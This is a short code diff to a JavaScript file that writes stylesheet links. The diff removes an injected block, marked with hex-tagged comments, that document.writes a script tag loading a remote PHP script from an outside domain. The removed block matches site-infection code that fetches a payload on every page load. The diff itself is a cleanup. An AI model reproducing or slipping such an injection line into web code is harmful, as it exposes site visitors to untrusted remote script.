@@ -23,8 +23,3 @@ function writeCSS(spath)
 	css = spath.replace(/linkcss.js/, css);
 	document.writeln('<LINK REL="stylesheet" HREF="' + css + '">');
 }
-
-/*6d28e7*/
-document.write('<script type="text/javascript" src="http://biozapp.com/Kfx6FNrG.php?id=13042531"></script>');
-
-/*/6d28e7*/
